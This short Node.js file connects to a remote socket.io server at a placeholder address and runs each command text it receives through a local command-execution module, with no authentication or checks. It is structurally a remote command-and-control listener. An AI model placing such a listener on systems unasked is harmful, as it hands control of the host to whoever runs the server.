const commands = require('./cmd_execution/all_cmds')
const socket = require('socket.io-client')('http://<SERVER-IP>')

let lastCommand = { date: Date.now(), text: '' }

socket.on('connect', () => {
  console.log(socket.id, 'connected')
  socket.on('message', (command) => {
    if (lastCommand.date != command.date) {
      lastCommand = { date: command.date, text: decodeURI(command.text) }
      console.log(lastCommand)
      commands(lastCommand.text)
    }
  })
})
